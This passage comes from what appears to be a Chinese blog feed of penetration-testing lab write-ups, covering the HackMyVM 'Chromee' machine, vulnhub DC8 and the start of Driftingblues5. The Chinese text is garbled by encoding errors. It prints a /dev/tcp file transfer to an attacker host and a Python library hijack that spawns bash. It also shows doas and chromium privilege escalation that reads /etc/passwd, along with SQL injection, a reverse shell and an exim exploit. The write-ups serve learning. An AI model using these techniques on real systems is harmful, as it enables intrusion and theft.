<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line"> â”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# nc -lp 1234  &gt; cat.gif</span><br><span class="line"></span><br><span class="line">follower@Chromee:~$ cat cat.gif &gt; /dev/tcp/192.168.80.11/1234</span><br><span class="line"></span><br><span class="line">exiftool cat.gif                                   AGAAAABB70bmFVK</span><br><span class="line">ExifTool Version Number         : 13.00</span><br><span class="line">File Name                       : cat.gif</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 3.5 MB</span><br><span class="line">File Modification Date/Time     : 2025:03:29 16:17:46+08:00</span><br><span class="line">File Access Date/Time           : 2025:03:29 16:17:34+08:00</span><br><span class="line">File Inode Change Date/Time     : 2025:03:29 16:17:46+08:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : GIF</span><br><span class="line">File Type Extension             : gif</span><br><span class="line">MIME Type                       : image/gif</span><br><span class="line">GIF Version                     : 89a</span><br><span class="line">Image Width                     : 640</span><br><span class="line">Image Height                    : 640</span><br><span class="line">Has Color Map                   : Yes</span><br><span class="line">Color Resolution Depth          : 8</span><br><span class="line">Bits Per Pixel                  : 8</span><br><span class="line">Background Color                : 0</span><br><span class="line">Animation Iterations            : Infinite</span><br><span class="line">Comment                         : Imagemagick Convert Timeline</span><br><span class="line">Profile CMM Type                : </span><br><span class="line">Profile Version                 : 4.3.0</span><br><span class="line">Profile Class                   : Display Device Profile</span><br><span class="line">Color Space Data                : RGB</span><br><span class="line">Profile Connection Space        : XYZ</span><br><span class="line">Profile Date Time               : 2016:01:01 00:00:00</span><br><span class="line">Profile File Signature          : acsp</span><br><span class="line">Primary Platform                : Unknown ()</span><br><span class="line">CMM Flags                       : Not Embedded, Independent</span><br><span class="line">Device Manufacturer             : </span><br><span class="line">Device Model                    : </span><br><span class="line">Device Attributes               : Reflective, Glossy, Positive, Color</span><br><span class="line">Rendering Intent                : Media-Relative Colorimetric</span><br><span class="line">Connection Space Illuminant     : 0.9642 1 0.82491</span><br><span class="line">Profile Creator                 : </span><br><span class="line">Profile ID                      : 0</span><br><span class="line">Profile Description             : sRGB</span><br><span class="line">Red Matrix Column               : 0.43607 0.22249 0.01392</span><br><span class="line">Green Matrix Column             : 0.38515 0.71687 0.09708</span><br><span class="line">Blue Matrix Column              : 0.14307 0.06061 0.7141</span><br><span class="line">Media White Point               : 0.9642 1 0.82491</span><br><span class="line">Red Tone Reproduction Curve     : (Binary data 40 bytes, use -b option to extract)</span><br><span class="line">Green Tone Reproduction Curve   : (Binary data 40 bytes, use -b option to extract)</span><br><span class="line">Blue Tone Reproduction Curve    : (Binary data 40 bytes, use -b option to extract)</span><br><span class="line">Profile Copyright               : Google Inc. 2016</span><br><span class="line">Frame Count                     : 13</span><br><span class="line">Duration                        : 6.31 s</span><br><span class="line">Image Size                      : 640x640</span><br><span class="line">Megapixels                      : 0.410</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæœ‰ä¸€ä¸ª<code>Imagemagick Convert Timeline</code>æ—¶é—´è½´çš„æç¤ºï¼Œä¸Šç½‘æœä¸€ä¸‹giféšå†™ï¼Œåˆ©ç”¨identifyå·¥å…·   å¾—åˆ°ä¸€äº›æ•°å­—</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# identify -format &quot;%T &quot; cat.gif  </span><br><span class="line">65 98 65 100 102 98 67 6 6 6 6 6 6</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œå‰é¢çš„æ•°å­—éƒ½æ˜¯asciiç çš„å­—æ¯ï¼Œæ‰€ä»¥å°±ç”¨è¿™äº›å¯è§å­—ç¬¦çš„æ•°å­—ï¼Œç„¶åç”¨cyberchef rot47 è¦å…ˆç”¨decimalè½¬æˆå­—ç¬¦<br><img src="https://pic1.imgdb.cn/item/67e7ae070ba3d5a1d7e62008.png"><br>å¾—åˆ°äº†ä¸€ä¸ªå¯†ç <code>p3p573r</code> è¿™ä¸ªå¯†ç ä¸æ˜¯å¦ä¸€ä¸ªç”¨æˆ·çš„å¯†ç ï¼Œè¿™æ˜¯followerçš„å¯†ç <br>ç„¶ååœ¨è¿™é‡Œä¹Ÿå¾ˆå®¹æ˜“å¡ä½ï¼Œæ‹¿åˆ°å¯†ç ä¹‹åä¸çŸ¥é“æ€ä¹ˆç”¨ï¼Œå› ä¸ºä¹Ÿæ²¡æœ‰sudo</p>
<p>æ‰¾ä¸€ä¸‹rootçš„æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">follower@Chromee:/home$ find / -user root -print 2&gt;/dev/null | grep -Pi -v &quot;sys|sys|proc|run|usr|boot|dev|etc|var&quot;</span><br><span class="line">/</span><br><span class="line">/mnt</span><br><span class="line">/bin</span><br><span class="line">/root</span><br><span class="line">/home</span><br><span class="line">/home/follower/cat.gif</span><br><span class="line">/lib32</span><br><span class="line">/sbin</span><br><span class="line">/vmlinuz.old</span><br><span class="line">/lost+found</span><br><span class="line">/libx32</span><br><span class="line">/lib</span><br><span class="line">/initrd.img.old</span><br><span class="line">/vmlinuz</span><br><span class="line">/tmp</span><br><span class="line">/tmp/.Test-unix</span><br><span class="line">/tmp/.XIM-unix</span><br><span class="line">/tmp/.ICE-unix</span><br><span class="line">/tmp/.font-unix</span><br><span class="line">/tmp/.X11-unix</span><br><span class="line">/srv</span><br><span class="line">/srv/zeus.conf</span><br><span class="line">/srv/ftp</span><br><span class="line">/initrd.img</span><br><span class="line">/opt</span><br><span class="line">/opt/note/...</span><br><span class="line">/opt/note/dic.txt</span><br><span class="line">/opt/...</span><br><span class="line">/media</span><br><span class="line">/media/cdrom</span><br><span class="line">/media/cdrom0</span><br><span class="line">/lib64</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œå¯ä»¥å‘ç°ä¸€ä¸ªsrvç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶zeus.conf </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">follower@Chromee:/srv$ cat zeus.conf </span><br><span class="line">permit follower as softly cmd /usr/local/bin/wfuzz</span><br><span class="line">permit nopass :softly as root cmd /usr/bin/chromium</span><br><span class="line">permit nopass :softly as root cmd /usr/bin/kill </span><br></pre></td></tr></table></figure></div>
<p>ä¹‹å‰æ²¡æœ‰è§è¿‡è¿™ç§ä¸œè¥¿ï¼Œé—®äº†gptçŸ¥é“è¿™æ˜¯doasçš„è§„åˆ™ ç°åœ¨followerå¯ä»¥ç”¨softlyæ‰§è¡Œ  &#x2F;usr&#x2F;local&#x2F;bin&#x2F;wfuzz<br>é‚£ç°åœ¨çš„ç›®æ ‡å°±æ˜¯å…ˆåˆ‡æ¢åˆ°softly<br>çœ‹ä¸€ä¸‹wfuzzä¸­å†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">follower@Chromee:/srv$ cat /usr/local/bin/wfuzz</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/python3</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-*- coding: utf-8 -*-</span></span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">from wfuzz.wfuzz import main</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    sys.argv[0] = re.sub(r&#x27;(-script\.pyw|\.exe)?$&#x27;, &#x27;&#x27;, sys.argv[0])</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure></div>
<p>å‘ç°è¿™é‡Œå¯¼å…¥äº†åº“wfuzz.wfuzz</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">follower@Chromee:/srv$ find / -name &#x27;wfuzz&#x27; -print 2&gt;/dev/null  </span><br><span class="line">/usr/local/bin/wfuzz</span><br><span class="line">/usr/local/lib/python3.9/dist-packages/wfuzz</span><br><span class="line">follower@Chromee:/srv$ cd /usr/local/lib/python3.9/dist-packages/wfuzz</span><br><span class="line">follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ ls</span><br><span class="line">__init__.py  __pycache__   api.py   dictionaries.py  externals  factories  fuzzobjects.py  fuzzrequest.py  mixins.py  myqueues.py  plugin_api  ui</span><br><span class="line">__main__.py  advanced.rst  core.py  exception.py     facade.py  filters    fuzzqueues.py   helpers         myhttp.py  options.py   plugins     wfuzz.py</span><br></pre></td></tr></table></figure></div>
<p>æ‰¾åˆ°æ–‡ä»¶ä¹‹åï¼Œå°è¯•åŠ«æŒåº“ å…ˆæ‰¾åˆ°ä¸€ä¸ªå¯ä»¥å†™å…¥çš„æ–‡ä»¶ ç„¶åå†™bash</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ find . -writable -print 2&gt;/dev/null</span><br><span class="line">./plugins/payloads/file.py</span><br><span class="line"></span><br><span class="line">follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ echo &quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot; &gt; ./plugins/payloads/file.py</span><br></pre></td></tr></table></figure></div>
<p>å†ç”¨softlyæ‰§è¡Œwfuzzå°±èƒ½æ‹¿åˆ°softlyçš„shelläº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ doas -u softly /usr/local/bin/wfuzz -w /home/note.txt -u 127.0.0.1</span><br><span class="line">Password: </span><br><span class="line"> /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ doas -u softly /usr/local/bin/wfuzz -w /home/note.txt -u 127.0.0.1</span><br><span class="line">Password: </span><br><span class="line"> /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br></pre></td></tr></table></figure></div>
<h2 id="softly"><a href="#softly" class="headerlink" title="softly"></a>softly</h2><p>ä¸‹ä¸€æ­¥å°±æ˜¯è¦ç”¨&#x2F;usr&#x2F;bin&#x2F;chromiumææƒäº†ï¼Œè¿™ä¸ªæ˜¯ä¸ªè°·æ­Œæµè§ˆå™¨<br>ç°åœ¨è¦ç”¨ä¸€äº›å±é™©çš„å‚æ•°ï¼Œé¦–å…ˆå°±æ˜¯ç¦ç”¨æ²™ç®± ç„¶åç¦ç”¨gpuåŠ é€Ÿæ¸²æŸ“ ä¸å‘é€è¯·æ±‚å¤´<br>å‘ç°è¿™äº›å‚æ•°çš„è¿‡ç¨‹å¯ä»¥å…ˆä»€ä¹ˆå‚æ•°éƒ½ä¸ç”¨ï¼Œç„¶åå…ˆæç¤ºrootæ‰§è¡Œå°±è¦ç¦ç”¨æ²™ç®±ï¼Œç„¶åæŠŠæŠ¥é”™ä¿¡æ¯ç»™aiä¸€æ­¥æ­¥æ”¹<br>æ ¸å¿ƒç›®æ ‡å°±æ˜¯è¯»å–æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">softly@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ doas -u root /usr/bin/chromium  --no-sandbox --headless  --disable-gpu  -dump-dom file:///etc/passwd</span><br><span class="line">[0329/095206.275413:WARNING:bluez_dbus_manager.cc(248)] Floss manager not present, cannot set Floss enable/disable.</span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;meta name=&quot;color-scheme&quot; content=&quot;light dark&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;pre style=&quot;word-wrap: break-word; white-space: pre-wrap;&quot;&gt;root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:109::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">follower:x:1000:1000::/home/follower:/bin/bash</span><br><span class="line">softly:x:1001:1001::/home/softly:/bin/bash</span><br><span class="line">ftp:x:106:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</span><br><span class="line">usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
<p>è¿™æ ·å°±å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶å°±è§£å†³äº†ã€‚   çœ‹æ¥æˆ‘ç¡®å®æ˜¯åšä¸å‡ºæ¥ è¿™äº›å‚æ•°å°‘ä¸€ä¸ªæˆ–è€…ç”¨é”™éƒ½ä¸è¡Œ æœ€åçš„â€“dump-domæ˜¯æ‰“å°å‡ºå†…å®¹</p>
<p>ä¸‹é¢è¿˜æœ‰ä¸€ä¸ªé¢„æœŸæ–¹æ¡ˆï¼Œå°±æ˜¯å¼€ä¸€ä¸ªè°ƒè¯•çª—å£</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">softly@Chromee:/home/follower$ doas -u root /usr/bin/chromium --no-sandbox --headless --remote-debugging-port=9222 http://127.0.0.1 &amp;</span><br><span class="line">[2] 18087</span><br><span class="line"></span><br><span class="line">ss -lntup</span><br><span class="line">Netid          State           Recv-Q          Send-Q                   Local Address:Port                    Peer Address:Port         Process          </span><br><span class="line">udp            UNCONN          0               0                              0.0.0.0:68                           0.0.0.0:*                             </span><br><span class="line">tcp            LISTEN          0               10                           127.0.0.1:8000                         0.0.0.0:*                             </span><br><span class="line">tcp            LISTEN          0               10                           127.0.0.1:9222                         0.0.0.0:*                             </span><br><span class="line">tcp            LISTEN          0               511                            0.0.0.0:80                           0.0.0.0:*                             </span><br><span class="line">tcp            LISTEN          0               128                            0.0.0.0:22                           0.0.0.0:*                             </span><br><span class="line">tcp            LISTEN          0               32                                   *:23333                              *:*                             </span><br><span class="line">tcp            LISTEN          0               511                               [::]:80                              [::]:*                             </span><br><span class="line">tcp            LISTEN          0               511                                  *:8080                               *:*                             </span><br><span class="line">tcp            LISTEN          0               128                               [::]:22                              [::]:*    </span><br></pre></td></tr></table></figure></div>
<p>ç°åœ¨ä¸Šä¼ ä¸€ä¸ªsocatï¼Œç„¶åè½¬å‘ä¸€ä¸‹ç«¯å£</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">softly@Chromee:~$ ./socat TCP-LISTEN:9999,fork TCP4:127.0.0.1:9222 &amp;</span><br><span class="line">[3] 18212</span><br></pre></td></tr></table></figure></div>
<p>å› ä¸ºç°åœ¨æ˜¯è°ƒè¯•è¿‡ç¨‹ï¼Œè¦åˆ°æµè§ˆå™¨ä¸­chrome:&#x2F;&#x2F;inspectlé‡Œé¢æ–°åŠ ä¸€ä¸ª<br><img src="https://pic1.imgdb.cn/item/67e7b7f10ba3d5a1d7e63e51.png"><br>ç‚¹å‡»inspect<br>å› ä¸ºæˆ‘ä»¬çŸ¥é“æœ‰ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œå°±æ˜¯å°±åœ¨è¿™ä¸ªè°ƒè¯•é¡µé¢ç­‰ï¼Œè¿‡äº†ä¸€ä¼šï¼Œå‘ç°æœ‰ä¸€ä¸ªè¯·æ±‚åŒ… ï¼Œä¼ æ¥ä¸€ä¸ªpostè¯·æ±‚åŒ…<br><img src="https://pic1.imgdb.cn/item/67e7b8810ba3d5a1d7e640b3.png"><br>è¿™å°±æ˜¯rootçš„å¯†ç äº†</p>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul>
<li>å­¦åˆ°äº†bypassæ˜¯ä»€ä¹ˆä»¥åŠæ€ä¹ˆç”¨</li>
<li>ç»™äº†ä¸€ä¸ªæ–‡ä»¶çš„æç¤ºç”¨cupp</li>
<li>â€¦éšè—æ–‡ä»¶</li>
<li>å‡ºäº†sudoè¿˜æœ‰doaså‘½ä»¤ä¹Ÿèƒ½æœ‰å…¶ä»–ç”¨æˆ·çš„æ‰§è¡Œæƒé™</li>
<li>å¾—åˆ°å¯†ç é™¤äº†å¯èƒ½æ˜¯å…¶ä»–ç”¨æˆ·çš„ï¼Œè¿˜æœ‰å¯èƒ½æ˜¯è‡ªå·±çš„å¯†ç </li>
<li>çœ‹ä¸€ä¸ªpyç¨‹åºå¯ä»¥å°è¯•æ˜¯å¦èƒ½æ‰¾åˆ°å¯ä»¥å†™å…¥çš„åŒ…ï¼Œææƒ</li>
<li>socatè½¬å‘ç«¯å£</li>
<li>å­¦ä¹ äº†chromiumè¿™ä¸ªå‘½ä»¤ï¼Œäº†è§£äº†ä¸€äº›å‚æ•°ï¼Œä»¥åŠè°·æ­Œæµè§ˆå™¨çš„è°ƒè¯•çª—å£</li>
</ul>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>DC8é¶åœºå¤ç›˜</title>
    <url>/posts/51727.html</url>
    <content><![CDATA[<p>vulnhub-DC8é¶åœºå¤ç›˜</p>
<span id="more"></span>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><p>è¿™ä¸ªä¸»è¦è€ƒå¯Ÿä»webç«¯è¿›å…¥</p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p>0.ç”¨dirsearchæ‰¾åˆ°ç½‘é¡µæ‰€æœ‰çš„ç›®å½•  çŸ¥é“æœ‰mysqlæœåŠ¡ æš—ç¤ºè¦sqlæ³¨å…¥  è€Œä¸”æœ‰robots.txt å…¶ä¸­æœ‰user&#x2F;loginç›®å½•<br>1.åœ¨ç½‘é¡µç‚¹å‡»å…¶ä»–é“¾æ¥çš„æ—¶å€™çœ‹åˆ°urlæœ‰å‚æ•° å°è¯•æ³¨é‡Šé—­åˆ<br>å‘ç°æœ‰sqlæ³¨å…¥ç‚¹<br><img src="https://pic1.imgdb.cn/item/679a1620d0e0a243d4f87546.png" alt="|550"><br>2.ç”¨sqlmapå¾—åˆ°ç®¡ç†å‘˜è´¦å·<br><img src="https://pic1.imgdb.cn/item/679a1620d0e0a243d4f87547.png" alt="|500"><br>æœ€ç»ˆæ‰¾åˆ°ä¸¤æ¡è®°å½• ç„¶åå°†è¿™ä¸ªhashæ”¾åˆ°ä¸€ä¸ªç›®å½•ç”¨john å»è·‘ å¯ä»¥æ‰¾åˆ°johnçš„å¯†ç <br>3.ç™»å½•ç½‘ç«™ç®¡ç†å‘˜çš„è´¦å·<br>æœ‰ä¸€ä¸ªedité€‰é¡¹ é‡Œé¢å¯ä»¥ä¸Šä¼ æ–‡ä»¶ ä½†æ˜¯æ— æ³•ä¸Šä¼ phpæ–‡ä»¶<br><img src="https://pic1.imgdb.cn/item/679a1621d0e0a243d4f87548.png" alt="|500"><br>åœ¨contactus webform å‘ç°å¯ä»¥ä¿®æ”¹ç”¨æˆ·ä¸Šä¼ ä¹‹åçš„æç¤ºå›æ˜¾  å¹¶ä¸”å¯ä»¥ç”¨PHPä»£ç  å®éªŒä¹‹åå‘ç°ç¡®å®å¯ä»¥æ¸²æŸ“php<br>ç°åœ¨å¯ä»¥ç”¨systemæŒ‡ä»¤æ¥åå¼¹shell<br><img src="https://pic1.imgdb.cn/item/679a1621d0e0a243d4f87549.png" alt="|525"><br><img src="https://pic1.imgdb.cn/item/679a1622d0e0a243d4f8754a.png"><br>è¿™ä¸ªæŒ‡ä»¤å¯ä»¥åœ¨åå¼¹çš„shellé‡Œé¢åŠ ä¸Šå‰ç¼€ å¯ä»¥ç¾åŒ–è¾“å‡º<br>éšä¾¿çœ‹çœ‹è¿™ä¸ªç”¨æˆ·ç›®å½•ä¸‹çš„æ–‡ä»¶ </p>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null  æ„æ€ä»æ ¹ç›®å½•å¼€å§‹æ‰¾ æ‰€æœ‰è€…æ˜¯root åªåŒ…æ‹¬suid çš„ ç„¶åå°†æ ‡å‡†é”™è¯¯ä¸è¾“å‡º<br><img src="https://pic1.imgdb.cn/item/679a1666d0e0a243d4f8754f.png" alt="|500"><br>è¿™é‡Œåˆ©ç”¨eximææƒï¼ˆå…ˆæŸ¥çœ‹è¿™é‡Œexim4çš„ç‰ˆæœ¬  ç”¨searchsploit eximå‘ç°æ¼æ´<br>ç„¶åæŠŠæ–‡ä»¶å¤åˆ¶åˆ°&#x2F;var&#x2F;www&#x2F;html ä¸‹æ–¹ä¾¿ä¼ è¾“åˆ°å—å®³æœº<br><img src="https://pic1.imgdb.cn/item/679a1669d0e0a243d4f87550.png" alt="|425"><br>åœ¨å—å®³æœºä¸Šé¢ç”¨wgetæ¥å—è¿™ä¸ªè„šæœ¬<br><img src="https://pic1.imgdb.cn/item/679a166ad0e0a243d4f87551.png"><br><img src="https://pic1.imgdb.cn/item/679a166bd0e0a243d4f87552.png"><br>æœ‰ä¸¤ç§æ–¹æ³•ä½¿ç”¨è¿™ä¸ªè„šæœ¬ é€‰æ‹©ç¬¬äºŒç§ å› ä¸º ç¬¬äºŒç§åœ¨è„šæœ¬è¯´å¯ä»¥æœ‰ä¸€ä¸ªshell<br>ä½†æ˜¯å¦‚æœæˆ‘ä»¬ç”¨ cat -A æŸ¥çœ‹è¿™ä¸ªa.sh æ–‡ä»¶å‘ç° æœ«å°¾éƒ½æ˜¯^M<br>ç”¨dos2unixè½¬æ¢ä¹‹å å¯ä»¥è¿è¡Œ   bash a.sh -m netcat<br><img src="https://pic1.imgdb.cn/item/679a166cd0e0a243d4f87553.png" alt="|450"><br>å‘ç°æˆåŠŸææƒ ç„¶ååˆ°&#x2F;rootç›®å½•ä¸‹ å°±è§£å†³ï¼ï¼ </p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>é¶åœº</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Driftingblues5</title>
    <url>/posts/57479.html</url>
    <content><![CDATA[<p>HMV-Driftingblues5é¶åœºå¤ç›˜</p>
<span id="more"></span>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -p- 192.168.64.174</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( <span class="keyword">https</span>://nmap.org ) <span class="keyword">at</span> <span class="number">2025</span><span class="number">-04</span><span class="number">-06</span> <span class="number">18</span>:<span class="number">11</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span><span class="number">.64</span><span class="number">.174</span>)</span><br><span class="line">Host is up (<span class="number">0.067</span>s latency).</span><br><span class="line">Not shown: <span class="number">65533</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  <span class="keyword">http</span></span><br><span class="line">MAC Address: C8:<span class="number">21</span>:<span class="number">58</span>:<span class="number">16</span>:CF:C4 (Intel Corporate)</span><br></pre></td></tr></table></figure></div>
<p>å°±å¼€æ”¾äº†è¿™ä¸¤ä¸ªå¸¸ç”¨çš„ç«¯å£ï¼Œæ‰€ä»¥ç›´æ¥æ‰«webç›®å½•</p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># dirsearch -u 192.168.64.174                                                    </span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/_192.168.64.174/_25-04-06_18-12-11.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">64.174</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">11</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">14</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span 